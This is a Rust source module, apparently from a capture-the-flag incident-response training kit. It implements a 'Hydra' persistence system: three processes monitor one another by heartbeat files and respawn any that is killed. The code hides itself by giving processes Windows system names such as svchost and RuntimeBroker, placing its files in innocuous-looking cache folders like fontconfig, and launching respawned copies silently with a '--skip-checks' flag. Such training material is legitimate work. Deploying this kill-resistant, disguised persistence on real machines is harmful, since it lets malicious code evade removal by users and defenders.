//! Hydra Process Redundancy System
//! 
//! Sistema de redundância com 3 processos (cabeças) que se monitoram mutuamente.
//! Se um processo morre, os outros o respawnam - como a Hidra mitológica.
//!
//! ⚠️ EDUCATIONAL PURPOSES ONLY - CTF IR Training
//!
//! Técnicas implementadas:
//! - Process spawning com diferentes identidades
//! - Mutex de instância única por cabeça
//! - Heartbeat via named pipes/files
//! - Respawn automático com backoff exponencial

use std::collections::HashMap;
use std::fs::{self, File, OpenOptions};
use std::io::Write;
use std::path::PathBuf;
use std::process::{Child, Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use tracing::{debug, error, info, warn};

/// Número de cabeças da Hydra (processos redundantes)
pub const HYDRA_HEADS: usize = 3;

/// Intervalo de heartbeat em segundos
const HEARTBEAT_INTERVAL: u64 = 5;

/// Timeout para considerar uma cabeça morta
const HEARTBEAT_TIMEOUT: u64 = 15;

/// Backoff máximo para respawn (segundos)
const MAX_RESPAWN_BACKOFF: u64 = 60;

/// Identidade de uma cabeça da Hydra
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum HydraHead {
    /// Cabeça Alpha - Processo principal
    Alpha = 0,
    /// Cabeça Beta - Primeiro backup
    Beta = 1,
    /// Cabeça Gamma - Segundo backup
    Gamma = 2,
}

impl HydraHead {
    pub fn from_index(idx: usize) -> Option<Self> {
        match idx {
            0 => Some(Self::Alpha),
            1 => Some(Self::Beta),
            2 => Some(Self::Gamma),
            _ => None,
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            Self::Alpha => "alpha",
            Self::Beta => "beta",
            Self::Gamma => "gamma",
        }
    }

    /// Retorna um nome de processo "natural" para disfarce
    #[allow(dead_code)]
    pub fn disguised_name(&self) -> &'static str {
        match self {
            Self::Alpha => "svchost",      // Windows service host
            Self::Beta => "RuntimeBroker", // Windows runtime
            Self::Gamma => "SearchApp",    // Windows search
        }
    }

    /// Retorna todas as cabeças exceto a atual
    pub fn siblings(&self) -> Vec<HydraHead> {
        [Self::Alpha, Self::Beta, Self::Gamma]
            .into_iter()
            .filter(|h| h != self)
            .collect()
    }
}

impl std::fmt::Display for HydraHead {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "Hydra::{}", self.name().to_uppercase())
    }
}

/// Estado de uma cabeça
#[derive(Debug, Clone)]
pub struct HeadState {
    pub head: HydraHead,
    pub pid: Option<u32>,
    pub last_heartbeat: Instant,
    pub respawn_count: u32,
    pub is_alive: bool,
}

impl HeadState {
    pub fn new(head: HydraHead) -> Self {
        Self {
            head,
            pid: None,
            last_heartbeat: Instant::now(),
            respawn_count: 0,
            is_alive: false,
        }
    }

    #[allow(dead_code)]
    pub fn is_stale(&self) -> bool {
        self.last_heartbeat.elapsed() > Duration::from_secs(HEARTBEAT_TIMEOUT)
    }

    pub fn update_heartbeat(&mut self) {
        self.last_heartbeat = Instant::now();
        self.is_alive = true;
    }
}

/// Gerenciador do sistema Hydra
pub struct HydraManager {
    /// Identidade desta instância
    my_head: HydraHead,
    /// Estado de todas as cabeças
    heads: HashMap<HydraHead, HeadState>,
    /// Diretório de comunicação entre processos
    ipc_dir: PathBuf,
    /// Flag de shutdown
    shutdown: Arc<AtomicBool>,
    /// Processos filhos spawados
    children: Vec<Child>,
}

impl HydraManager {
    /// Cria ou assume uma identidade de cabeça
    pub fn new() -> Result<Self, HydraError> {
        let ipc_dir = Self::get_ipc_dir()?;
        fs::create_dir_all(&ipc_dir)?;

        // Determina qual cabeça seremos
        let my_head = Self::claim_head(&ipc_dir)?;
        
        info!("[HYDRA] Initialized as {} (PID: {})", my_head, std::process::id());

        let mut heads = HashMap::new();
        for i in 0..HYDRA_HEADS {
            if let Some(h) = HydraHead::from_index(i) {
                heads.insert(h, HeadState::new(h));
            }
        }

        // Marca nossa cabeça como viva
        if let Some(state) = heads.get_mut(&my_head) {
            state.pid = Some(std::process::id());
            state.is_alive = true;
        }

        Ok(Self {
            my_head,
            heads,
            ipc_dir,
            shutdown: Arc::new(AtomicBool::new(false)),
            children: Vec::new(),
        })
    }

    /// Diretório IPC baseado no sistema
    fn get_ipc_dir() -> Result<PathBuf, HydraError> {
        // Usa diretório "natural" do sistema
        #[cfg(windows)]
        {
            let appdata = std::env::var("LOCALAPPDATA")
                .unwrap_or_else(|_| "C:\\Users\\Public".into());
            // Nome disfarçado
            Ok(PathBuf::from(appdata).join(".cache").join("ms-runtime"))
        }

        #[cfg(unix)]
        {
            let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
            // Nome disfarçado
            Ok(PathBuf::from(home).join(".cache").join("fontconfig"))
        }
    }

    /// Tenta reivindicar uma cabeça disponível
    fn claim_head(ipc_dir: &PathBuf) -> Result<HydraHead, HydraError> {
        for i in 0..HYDRA_HEADS {
            let head = HydraHead::from_index(i).unwrap();
            let lock_path = ipc_dir.join(format!("{}.lock", head.name()));

            // Tenta criar lock exclusivo
            match Self::try_acquire_lock(&lock_path) {
                Ok(true) => {
                    debug!("[HYDRA] Claimed head: {}", head);
                    return Ok(head);
                }
                Ok(false) => {
                    debug!("[HYDRA] Head {} already claimed", head);
                    continue;
                }
                Err(e) => {
                    warn!("[HYDRA] Error claiming {}: {}", head, e);
                    continue;
                }
            }
        }

        Err(HydraError::AllHeadsClaimed)
    }

    /// Tenta adquirir lock para uma cabeça
    fn try_acquire_lock(path: &PathBuf) -> Result<bool, HydraError> {
        // Verifica se lock existe e está "vivo"
        if path.exists() {
            // Lê PID do lock
            if let Ok(content) = fs::read_to_string(path) {
                if let Ok(pid) = content.trim().parse::<u32>() {
                    // Verifica se processo ainda existe
                    if Self::process_exists(pid) {
                        return Ok(false); // Cabeça ocupada por processo vivo
                    }
                }
            }
            // Lock órfão, remove
            let _ = fs::remove_file(path);
        }

        // Cria novo lock
        let mut file = File::create(path)?;
        write!(file, "{}", std::process::id())?;
        Ok(true)
    }

    /// Verifica se processo existe
    fn process_exists(pid: u32) -> bool {
        #[cfg(unix)]
        {
            // kill -0 verifica existência sem matar
            unsafe { libc::kill(pid as i32, 0) == 0 }
        }

        #[cfg(windows)]
        {
            use std::process::Command;
            Command::new("tasklist")
                .args(["/FI", &format!("PID eq {}", pid)])
                .output()
                .map(|o| {
                    let out = String::from_utf8_lossy(&o.stdout);
                    out.contains(&pid.to_string())
                })
                .unwrap_or(false)
        }

        #[cfg(not(any(unix, windows)))]
        {
            let _ = pid;
            false
        }
    }

    /// Envia heartbeat para as outras cabeças
    pub fn send_heartbeat(&self) -> Result<(), HydraError> {
        let hb_path = self.ipc_dir.join(format!("{}.hb", self.my_head.name()));
        
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);

        let mut file = OpenOptions::new()
            .write(true)
            .create(true)
            .truncate(true)
            .open(&hb_path)?;

        write!(file, "{}:{}", std::process::id(), timestamp)?;
        
        debug!("[HYDRA] {} heartbeat sent", self.my_head);
        Ok(())
    }

    /// Verifica heartbeats das outras cabeças
    pub fn check_siblings(&mut self) -> Vec<HydraHead> {
        let mut dead_heads = Vec::new();

        for sibling in self.my_head.siblings() {
            let hb_path = self.ipc_dir.join(format!("{}.hb", sibling.name()));

            let is_alive = if let Ok(content) = fs::read_to_string(&hb_path) {
                if let Some(ts_str) = content.split(':').nth(1) {
                    if let Ok(ts) = ts_str.trim().parse::<u64>() {
                        let now = SystemTime::now()
                            .duration_since(UNIX_EPOCH)
                            .map(|d| d.as_secs())
                            .unwrap_or(0);
                        
                        now.saturating_sub(ts) < HEARTBEAT_TIMEOUT
                    } else {
                        false
                    }
                } else {
                    false
                }
            } else {
                false
            };

            if let Some(state) = self.heads.get_mut(&sibling) {
                if is_alive {
                    state.update_heartbeat();
                } else if state.is_alive {
                    // Era vivo, agora está morto
                    warn!("[HYDRA] {} seems dead", sibling);
                    state.is_alive = false;
                    dead_heads.push(sibling);
                }
            }
        }

        dead_heads
    }

    /// Respawna uma cabeça morta
    pub fn respawn_head(&mut self, head: HydraHead) -> Result<(), HydraError> {
        info!("[HYDRA] Respawning {} from {}", head, self.my_head);

        // Limpa lock antigo
        let lock_path = self.ipc_dir.join(format!("{}.lock", head.name()));
        let _ = fs::remove_file(&lock_path);

        // Limpa heartbeat antigo
        let hb_path = self.ipc_dir.join(format!("{}.hb", head.name()));
        let _ = fs::remove_file(&hb_path);

        // Obtém caminho do executável atual
        let exe_path = std::env::current_exe()?;

        // Backoff exponencial
        let state = self.heads.get_mut(&head).unwrap();
        let backoff = std::cmp::min(
            2u64.pow(state.respawn_count),
            MAX_RESPAWN_BACKOFF
        );
        state.respawn_count += 1;

        if backoff > 1 {
            debug!("[HYDRA] Waiting {}s before respawn (attempt #{})", backoff, state.respawn_count);
            std::thread::sleep(Duration::from_secs(backoff));
        }

        // Spawn com argumentos para indicar role
        let child = Command::new(&exe_path)
            .args(["--skip-checks", "--hydra-role", head.name()])
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()?;

        info!("[HYDRA] Spawned {} with PID {}", head, child.id());
        state.pid = Some(child.id());
        self.children.push(child);

        Ok(())
    }

    /// Loop principal do watchdog
    #[allow(dead_code)]
    pub async fn run_watchdog(&mut self) -> Result<(), HydraError> {
        info!("[HYDRA] Starting watchdog loop as {}", self.my_head);

        loop {
            if self.shutdown.load(Ordering::SeqCst) {
                info!("[HYDRA] Shutdown requested");
                break;
            }

            // Envia heartbeat
            if let Err(e) = self.send_heartbeat() {
                error!("[HYDRA] Failed to send heartbeat: {}", e);
            }

            // Verifica irmãos
            let dead = self.check_siblings();
            
            // Respawna mortos
            for head in dead {
                if let Err(e) = self.respawn_head(head) {
                    error!("[HYDRA] Failed to respawn {}: {}", head, e);
                }
            }

            tokio::time::sleep(Duration::from_secs(HEARTBEAT_INTERVAL)).await;
        }

        Ok(())
    }

    /// Inicia as outras cabeças se necessário
    pub fn spawn_siblings(&mut self) -> Result<(), HydraError> {
        // Só Alpha inicia as outras cabeças inicialmente
        if self.my_head != HydraHead::Alpha {
            debug!("[HYDRA] {} waiting for Alpha to spawn siblings", self.my_head);
            return Ok(());
        }

        info!("[HYDRA] Alpha spawning siblings...");

        for sibling in self.my_head.siblings() {
            // Verifica se já está rodando
            let hb_path = self.ipc_dir.join(format!("{}.hb", sibling.name()));
            if hb_path.exists() {
                if let Ok(content) = fs::read_to_string(&hb_path) {
                    if let Some(ts_str) = content.split(':').nth(1) {
                        if let Ok(ts) = ts_str.trim().parse::<u64>() {
                            let now = SystemTime::now()
                                .duration_since(UNIX_EPOCH)
                                .map(|d| d.as_secs())
                                .unwrap_or(0);
                            
                            if now.saturating_sub(ts) < HEARTBEAT_TIMEOUT {
                                info!("[HYDRA] {} already running", sibling);
                                continue;
                            }
                        }
                    }
                }
            }

            // Spawna
            self.respawn_head(sibling)?;
            
            // Pequeno delay entre spawns para evitar race
            std::thread::sleep(Duration::from_millis(500));
        }

        Ok(())
    }

    /// Para o sistema Hydra
    pub fn shutdown(&self) {
        info!("[HYDRA] Initiating shutdown...");
        self.shutdown.store(true, Ordering::SeqCst);
        
        // Remove nosso lock e heartbeat
        let lock_path = self.ipc_dir.join(format!("{}.lock", self.my_head.name()));
        let hb_path = self.ipc_dir.join(format!("{}.hb", self.my_head.name()));
        
        let _ = fs::remove_file(lock_path);
        let _ = fs::remove_file(hb_path);
    }

    /// Retorna a identidade desta cabeça
    pub fn my_identity(&self) -> HydraHead {
        self.my_head
    }

    /// Verifica se todas as cabeças estão vivas
    #[allow(dead_code)]
    pub fn all_heads_alive(&self) -> bool {
        self.heads.values().all(|s| s.is_alive)
    }

    /// Conta cabeças vivas
    pub fn alive_count(&self) -> usize {
        self.heads.values().filter(|s| s.is_alive).count()
    }
}

impl Drop for HydraManager {
    fn drop(&mut self) {
        self.shutdown();
        
        // Espera processos filhos terminarem (com timeout)
        for child in &mut self.children {
            let _ = child.kill();
        }
    }
}

/// Erros do sistema Hydra
#[derive(Debug, thiserror::Error)]
pub enum HydraError {
    #[error("All hydra heads are claimed")]
    AllHeadsClaimed,
    
    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),
    
    #[error("IPC error: {0}")]
    #[allow(dead_code)]
    Ipc(String),
    
    #[error("Spawn failed: {0}")]
    #[allow(dead_code)]
    SpawnFailed(String),
}

#[cfg(unix)]
mod libc {
    extern "C" {
        pub fn kill(pid: i32, sig: i32) -> i32;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_head_siblings() {
        let siblings = HydraHead::Alpha.siblings();
        assert_eq!(siblings.len(), 2);
        assert!(siblings.contains(&HydraHead::Beta));
        assert!(siblings.contains(&HydraHead::Gamma));
    }

    #[test]
    fn test_head_names() {
        assert_eq!(HydraHead::Alpha.name(), "alpha");
        assert_eq!(HydraHead::Beta.name(), "beta");
        assert_eq!(HydraHead::Gamma.name(), "gamma");
    }
}
